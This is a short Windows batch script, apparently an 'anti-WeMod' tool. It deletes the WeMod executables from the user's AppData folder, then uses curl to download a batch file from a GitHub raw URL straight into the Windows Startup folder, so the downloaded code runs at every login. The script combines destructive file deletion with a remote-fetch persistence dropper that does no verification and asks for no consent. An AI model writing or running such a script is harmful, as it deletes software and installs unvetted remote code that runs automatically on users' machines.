@echo off
rem CD to wemod Location 
del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
del C:\Users\%username%\AppData\Local\WeMod\Update.exe
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat